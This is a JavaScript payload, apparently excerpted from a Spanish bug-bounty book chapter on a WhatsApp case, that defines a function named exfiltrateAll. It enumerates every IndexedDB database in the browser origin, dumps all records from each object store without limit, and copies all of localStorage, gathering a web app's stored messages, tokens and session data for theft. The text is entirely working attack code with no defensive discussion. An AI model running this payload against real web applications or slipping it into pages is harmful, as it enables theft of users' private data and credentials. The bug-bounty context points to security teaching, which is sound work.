// Extraído de: LibroBugBounty/cap-27-caso-whatsapp.md
// extract_payload.js -- Volcado completo de IndexedDB
async function exfiltrateAll() {
    const results = {};

    // Enumerar todas las bases de datos
    const dbs = await indexedDB.databases();
    results.databases = dbs.map(d => ({
        name: d.name, version: d.version
    }));

    // Extraer cada base de datos completa
    for (const dbInfo of dbs) {
        const db = await new Promise((resolve, reject) => {
            const req = indexedDB.open(dbInfo.name, dbInfo.version);
            req.onsuccess = () => resolve(req.result);
            req.onerror = () => reject(req.error);
        });

        const storeNames = Array.from(db.objectStoreNames);
        results[dbInfo.name] = {stores: storeNames, data: {}};

        for (const storeName of storeNames) {
            const tx = db.transaction(storeName, 'readonly');
            const store = tx.objectStore(storeName);
            const allData = await new Promise((resolve, reject) => {
                const req = store.getAll();
                req.onsuccess = () => resolve(req.result);
                req.onerror = () => reject(req.error);
            });

            // Volcar todos los registros sin limite
            results[dbInfo.name].data[storeName] = {
                count: allData.length,
                records: allData.map(item => {
                    try {
                        return JSON.parse(JSON.stringify(item));
                    } catch(e) {
                        return String(item).substring(0, 500);
                    }
                })
            };
        }
        db.close();
    }

    // localStorage y sessionStorage tambien
    results.localStorage = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        results.localStorage[key] = localStorage.getItem(key);
    }

    return results;
}
